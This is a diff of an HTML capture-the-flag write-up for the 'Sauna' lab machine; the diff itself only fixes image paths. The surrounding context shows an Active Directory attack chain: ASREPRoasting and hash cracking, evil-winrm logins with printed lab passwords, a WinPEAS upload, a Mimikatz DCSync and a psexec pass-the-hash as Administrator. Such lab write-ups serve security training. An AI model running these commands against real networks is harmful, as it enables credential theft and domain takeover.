@@ -189,43 +189,43 @@ Read data files from: /usr/share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Jun  3 12:13:28 2026 -- 1 IP address (1 host up) scanned in 95.99 seconds</pre>
 
-            <img src="images/sauna-names-1.png" alt="Employee names found on the site">
+            <img src="../images/sauna-names-1.png" alt="Employee names found on the site">
             <p>Taking these names and then formatting them into commonly used formats, I will try ASREPRoasting.</p>
-            <img src="images/sauna-usernames-2.png" alt="Formatted username list">
+            <img src="../images/sauna-usernames-2.png" alt="Formatted username list">
 
             <h3>ASREPRoasting</h3>
             <p>Using the username list, I attempt ASREPRoasting.</p>
-            <img src="images/sauna-asreproast-1.png" alt="ASREPRoasting attempt against the username list">
+            <img src="../images/sauna-asreproast-1.png" alt="ASREPRoasting attempt against the username list">
             <p>The user fsmith returns a hash. Decoding the hash will give us the password which we can then run on the different services.</p>
-            <img src="images/sauna-hash-crack-1.png" alt="Cracking the AS-REP hash for fsmith">
+            <img src="../images/sauna-hash-crack-1.png" alt="Cracking the AS-REP hash for fsmith">
 
             <h3>Netexec</h3>
-            <img src="images/sauna-netexec-1.png" alt="Validating fsmith credentials with netexec">
+            <img src="../images/sauna-netexec-1.png" alt="Validating fsmith credentials with netexec">
 
             <h3>Evil-WinRM as fsmith</h3>
-            <img src="images/sauna-evilwinrm-fsmith-1.png" alt="Evil-WinRM session as fsmith">
+            <img src="../images/sauna-evilwinrm-fsmith-1.png" alt="Evil-WinRM session as fsmith">
             <pre>evil-winrm -i $target -u fsmith -p "TheStrokes23"</pre>
 
             <h3>User Proof</h3>
-            <img src="images/sauna-user-proof-1.png" alt="User flag proof">
+            <img src="../images/sauna-user-proof-1.png" alt="User flag proof">
             <pre>whoami; hostname; ipconfig; cat user.txt</pre>
 
             <h3>WinPEASx64.exe</h3>
-            <img src="images/sauna-winpeas-upload-1.png" alt="Uploading WinPEAS to the target">
+            <img src="../images/sauna-winpeas-upload-1.png" alt="Uploading WinPEAS to the target">
             <pre>upload /home/bruhj/Desktop/windows/winPEASx64.exe</pre>
-            <img src="images/sauna-winpeas-output-1.png" alt="WinPEAS output">
+            <img src="../images/sauna-winpeas-output-1.png" alt="WinPEAS output">
 
             <h3>AutoLogon Credentials</h3>
-            <img src="images/sauna-autologon-1.png" alt="AutoLogon credentials found via WinPEAS">
+            <img src="../images/sauna-autologon-1.png" alt="AutoLogon credentials found via WinPEAS">
             <p>The user svc_loanmanager doesn't exist, but svc_loanmgr is a close match.</p>
             <pre>svc_loanmgr : Moneymakestheowrldgoround!</pre>
 
             <h3>Evil-WinRM as svc_loanmgr</h3>
-            <img src="images/sauna-evilwinrm-svcloanmgr-1.png" alt="Evil-WinRM session as svc_loanmgr">
+            <img src="../images/sauna-evilwinrm-svcloanmgr-1.png" alt="Evil-WinRM session as svc_loanmgr">
 
             <h3>BloodHound</h3>
-            <img src="images/sauna-bloodhound-1.png" alt="BloodHound graph showing DCSync rights">
-            <img src="images/sauna-bloodhound-2.png" alt="BloodHound attack path detail">
+            <img src="../images/sauna-bloodhound-1.png" alt="BloodHound graph showing DCSync rights">
+            <img src="../images/sauna-bloodhound-2.png" alt="BloodHound attack path detail">
 
             <h3>Mimikatz</h3>
             <pre>C:\Users\svc_loanmgr\Desktop&gt;mimikatz.exe
@@ -299,11 +299,11 @@ Supplemental Credentials:
     [29 WDigest hash entries redacted for brevity]</pre>
 
             <h3>impacket-psexec</h3>
-            <img src="images/sauna-psexec-1.png" alt="impacket-psexec authenticating as Administrator via pass-the-hash">
+            <img src="../images/sauna-psexec-1.png" alt="impacket-psexec authenticating as Administrator via pass-the-hash">
             <pre>impacket-psexec $domain/Administrator@$target -hashes ":[redacted NTLM hash]"</pre>
 
             <h3>Root Proof</h3>
-            <img src="images/sauna-root-proof-1.png" alt="Root flag proof">
+            <img src="../images/sauna-root-proof-1.png" alt="Root flag proof">
         </section>
     </main>
     <footer>
